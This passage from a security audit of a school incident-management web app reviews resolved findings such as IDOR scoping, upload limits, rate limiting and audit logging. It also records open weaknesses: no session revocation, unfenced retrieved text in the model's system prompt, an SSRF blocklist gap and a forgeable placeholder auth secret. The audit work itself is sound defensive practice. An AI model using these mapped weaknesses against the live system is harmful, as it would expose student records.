  policy-mutation handlers call `requireRole('admin')` in the handler, each with
  the comment explaining why middleware alone is not enough.
- **SEC-7** (IDOR on every entity) — every by-id read and write is scoped:
  `incidents/[id]` GET `:32` and PATCH `:110`, `chat/[incidentId]` `:19`, `chat`
  `:55`, `obligations` `:29`, `obligations/[id]` `:38`,
  `attachments/upload` `:51`, `incident-summary.ts:37`. All return **404**.
  Regression-tested with real foreign ids, not with `does-not-exist`:
  `e2e/incident-management.spec.ts:126`, `:131`, `:191`, `:361`, and the comment
  at `:133` states the 404-not-403 rule.
- **SEC-8** (caller-supplied `userId`) — `chatMessageSchema` has no `userId`
  field and says so (`src/lib/validation.ts:32-33`); `chat/history` filters on
  the session id with the old bug documented (`:8-10`); grepping `src/app/api`
  for `headers.get` and `searchParams.get` turns up no identity read anywhere —
  the only survivors are pagination, policy filters, and an obligations `window`
  flag.
- **SEC-9** (unvalidated model output) — classifier and obligation output parse
  through zod enums (`src/lib/ai/claude-service.ts:14-24`, `:32-45`). The
  retrieval half is SEC-25, still open; see SEC-37.
- **SEC-10, SEC-22** (upload OOM) — `readCappedFormData`
  (`src/lib/uploads.ts:95-136`) checks Content-Length and then enforces a
  counting `TransformStream` that *errors* past the ceiling; both upload routes
  use it instead of `request.formData()`. The corrected docstring on
  `assertWithinSizeLimit` (`:43-51`) no longer claims to bound memory.
- **SEC-11, SEC-23** (rate limiting) — sign-in in `middleware.ts:41-55`; chat,
  both summary routes and both upload routes via `enforceRateLimit`. Counters are
  per-process by decision, documented at `src/lib/rate-limit.ts:10-13` and
  `docs/roadmap.md:408`, and correct at the pinned `maxReplicas: 1`. The key,
  not the counter, is the problem — SEC-31.
- **SEC-12** (pagination) — `paginationSchema` coerces, rejects garbage and
  clamps to `MAX_PAGE_SIZE` (`src/lib/validation.ts:126-139`); the only
  `skip`/`take` from user input is `src/app/api/incidents/route.ts:84-85`.
- **SEC-13** (unused zod schemas) — closed for incidents, chat and obligations.
  Still open for the four admin write handlers; filed as SEC-36.
- **SEC-14** (dev server in production) — multi-stage `Dockerfile` with
  `NODE_ENV=production` (`:55`), `node server.js` (`:79`), a non-root `nextjs`
  user in both the runner (`:60`, `:77`) and the migrator (`:49-50`), and no bind
  mount in `docker-compose.yml`. `.dockerignore` excludes `.env*` (keeping
  `.env.example`), `uploads/` and `data/` from the build context, with the reason
  written at the top.
- **SEC-15** (raw exception text) — `chat/summary` routes through
  `createErrorResponse`, which returns `error.message` only when
  `NODE_ENV === 'development'` (`src/lib/errors.ts:182`). No handler returns a
  raw message.
- **SEC-16** (`determineDataSensitivity` discarded) — recorded on the assistant
  message metadata (`src/app/api/chat/route.ts:230`).
- **SEC-17, SEC-20** (audit trail) — `recordAudit`
  (`src/lib/audit.ts:29-52`) writes `AuditLog` and never throws; called on
  incident create/view/update, obligation update, summary create, attachment
  view, and all seven admin mutations. `PUT /api/admin/prompts/[id]` captures the
  previous content before writing (`:59-62`, `:91`), which is what makes a prompt
  change reconstructable.
- **SEC-18** (ESLint disabled in build) — `next.config.ts` has no `eslint` block,
  with the history left in the comment.
- **SEC-21** (`createdBy` from the body) — `createdBy: guard.user.id`
  (`src/app/api/admin/prompts/route.ts:66`).
- **SEC-27** (whole Prisma rows) — `GET /api/policies` projects six fields
  (`src/app/api/policies/route.ts:35-42`). The attachment residue of the same
  class is SEC-39.
- **SEC-28** (cookie `Secure`) — `shouldUseSecureCookies` derives from the
  declared URL, not the request protocol or `NODE_ENV`
  (`src/auth.config.ts:47-53`), and the deploy template sets
  `NEXTAUTH_URL=https://${APP_FQDN}` with the reasoning inline
  (`containerapp.template.yaml:43-47`). Cookie is `httpOnly`, `sameSite=lax`,
  host-only, `path=/`.
- **SEC-29** (duplicate route outside `/api/admin`) — deleted.

Also verified clean, and worth recording because each was a plausible place to
find something:

- **No raw SQL.** Zero hits for `$queryRaw`/`$executeRaw`/`Prisma.raw` across
  `src/`, `scripts/`, `e2e/`. The keyword fallback in
  `src/lib/ai/rag.ts:244-264` builds a Prisma `OR` of `contains` predicates from
  keywords already stripped to `[\w\s]` at `:222-227` — parameterised, no
  string-built query.
- **No XSS sink.** Zero `dangerouslySetInnerHTML`, `innerHTML`, `eval` or
  `new Function`. Markdown goes through `react-markdown` v10 with no
  `rehype-raw`, so raw HTML is inert and hrefs pass the default URL transform
  (`javascript:` stripped). The gap is `img`, not HTML — SEC-33.
- **No committed secrets.** `.env` is untracked and absent from history;
  `git grep` for `sk-`, `sk-ant-`, `AKIA` and credentialed Postgres URLs across
  tracked files returns only `postgres:postgres@localhost` in CI and compose, and
  the `${VAR}` template in `provision.sh`. No `NEXT_PUBLIC_*` variable exists, so
  nothing reaches the client bundle. `deploy/azure/.env` and `.provisioned` are
  gitignored (`.gitignore:56-57`), and `provision.sh:70` chmods `.provisioned`
  600.
- **No PII about minors in logs.** `src/lib/logger.ts` has no redaction config,
  but nothing hands it student content: `logRequest`/`logResponse` take a method,
  a template path, a status and a duration; `logError` takes the error and a
  context of ids and endpoints; `logAudit` mirrors the audit row. The one
  concentration of incident-derived text is the `AuditLog.details` column
  (incident titles, obligation descriptions, attachment filenames), which is the
  FERPA disclosure record and belongs there.
- **CSRF.** No token check on our own routes, but the session cookie is
  `SameSite=Lax` and host-only, which withholds it from cross-site POST,
  `multipart/form-data` and iframe navigation; all `SameSite=Lax`-permitted
  requests (top-level GET) reach read-only handlers. NextAuth's own endpoints
  carry their own CSRF token. An `Origin` check would be belt-and-braces.
- **`AUTH_TRUST_HOST`.** Set to `true` in both compose and the Container Apps
  template, which is normally a host-header-poisoning concern. It is safe here
  because `NEXTAUTH_URL` is also set: `next-auth/lib/env.js:5-12`
  (`reqWithEnvURL`) rewrites the request origin to the declared URL before the
  handler sees it, so the `Host` header cannot steer callback construction.
- **`AUTH_SECRET`.** `next-auth/lib/env.js:22` accepts `NEXTAUTH_SECRET` as a
  fallback, which is what this checkout's `.env` supplies; `provision.sh:14-17`
  requires the value to be non-empty before deploying. Nothing rejects the
  literal placeholder in `.env.example:7` — see OQ-8.
- **Session lifetime.** 30-minute `maxAge` with 5-minute `updateAge`
  (`src/auth.config.ts:69-70`), chosen because these screens get left open on
  desks (`:62-67`). That is the mitigation currently standing in for SEC-19.

### Prior findings still open, and not recorded in the roadmap

Not re-filed — they keep their original numbers — but they are absent from
`docs/roadmap.md`'s hardening table, so they are open without being tracked:

- **SEC-19** — a session's role is never re-checked and there is no revocation
  mechanism. Confirmed unchanged: `prisma/schema.prisma:18-43` has no
  `isActive`, `requireUser` (`src/lib/session.ts:25-39`) reads only the token,
  and the recommended fix (re-read `{role, isActive}`) is unimplemented. A
  demoted admin keeps admin until the 30-minute token expires; a compromised
  cookie cannot be revoked at all.
- **SEC-25** — retrieved policy text still enters the `system` parameter
  unfenced (`src/lib/ai/claude-service.ts:270-279`). Now narrower than filed:
  only the guidance path does this, since `deriveObligations` and
  `generateChatSummary` put the context in the user turn. See SEC-33 and SEC-37.
- **SPEC-49** — `GET /api/chat/[incidentId]` returns a full consultation
  transcript and writes no `AuditLog` row, unlike every other disclosive read.
  It is the most disclosive read in the app.

---

## Open questions

**OQ-6 — Is "any Azure service" an acceptable perimeter for the incident
database during the pilot, and if so for how long?** SEC-34 has two possible
answers and they are not equivalent. Accepting it for a single-district pilot,
recorded with an expiry, is a defensible product call; a private endpoint costs a
day of work and a redeploy. What should not happen is what has happened, which is
that the exposure is described in a code comment as narrower than it is, so
nobody has had to make the call. A second question rides along: should the app
have its own Postgres role rather than the server admin's? That one has no
downside I can see, and closing it does not require answering the first.

**OQ-7 — Who is allowed to be a policy source?** `safeFetchText` is a
blocklist, and SEC-32 is the second notation it has failed to classify. The
allowlist recorded at `docs/roadmap.md:410` was deferred as *"a decision about
permitted policy sources"* — that decision is now load-bearing for a security
control, not just for ingestion hygiene. Districts pull policy from a small,
stable set of hosts (the state legislature, the SAU's own site, a policy-service
vendor). If that set can be named, the allowlist replaces both the blocklist and
the rebinding gap. If it cannot, the blocklist needs CIDR containment and a test
matrix, and someone should own it.

**OQ-8 — Should the app refuse to start on a placeholder or weak
`AUTH_SECRET`?** With `strategy: 'jwt'`, the secret is the whole of authorization
— a known value forges any session at any role. `.env.example:7` ships the fixed
string `"change-me-generate-with-openssl-rand-base64-32"`, and nothing anywhere
rejects it: `provision.sh` only checks non-emptiness, and a `.env` copied
verbatim would boot and authenticate normally. This checkout is not affected, and
I did not file it as a finding because it takes an operator mistake. But it is
the one mistake whose consequence is total, it is silent, and a five-line startup
assertion (reject the placeholder, reject anything under ~32 bytes of entropy)
would make it impossible. Worth deciding whether that assertion is wanted, since
it is the kind of guard that annoys developers on day one and saves a district on
day two hundred.
